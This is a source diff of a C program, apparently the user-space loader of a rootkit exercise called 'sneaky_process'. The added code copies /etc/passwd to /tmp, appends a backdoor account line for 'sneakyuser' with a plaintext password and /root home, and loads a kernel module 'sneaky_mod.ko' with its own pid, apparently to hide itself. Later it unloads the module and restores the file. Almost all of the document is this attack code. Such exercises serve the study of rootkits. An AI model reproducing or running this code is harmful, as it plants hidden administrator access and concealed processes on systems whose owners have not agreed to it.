@@ -1,33 +1,22 @@
 #include <stdio.h>
 #include <stdlib.h>
 
-void copy_pwd(const char *srcName, const char *tarName)
-{
-    FILE *srcFile = fopen(srcName, "r");
-    FILE *tarFile = fopen(tarName, "w");
-    if (srcFile == NULL)
-    {
-        printf("Cannot open file %s \n", srcName);
-    }
-    if (tarFile == NULL)
-    {
-        printf("Cannot open file %s \n", srcName);
-    }
 
-    char buf[BUFSIZ];
-    size_t size;
-    while (size = fread(buf, 1, BUFSIZ, srcFile))
-    {
-        fwrite(buf, 1, size, tarFile);
-    }
+int main() {
+  printf("sneaky_process pid=%d\n", getpid());
+  system("cp /etc/passwd /tmp");
+  system("echo 'sneakyuser:abc123:2000:2000:sneakyuser:/root:bash\n' >> "
+         "/etc/passwd");
+  char arg[50];
+  sprintf(arg, "insmod sneaky_mod.ko sneaky_pid=%d", (int)getpid());
+  system(arg);
 
-    fclose(tarFile);
-    fclose(tarFile);
-}
+  char c;
+  while ((c = getchar()) != 'q') {
+  }
 
-int main()
-{
-    printf("sneaky_process pid=%d\n", getpid());
-    copy_pwd("/etc/passwd", "/tmp/passwd");
-    return EXIT_SUCCESS;
+  system("rmmod sneaky_mod.ko");
+  system("cp /tmp/passwd /etc");
+  system("rm /tmp/passwd");
+  return EXIT_SUCCESS;
 }
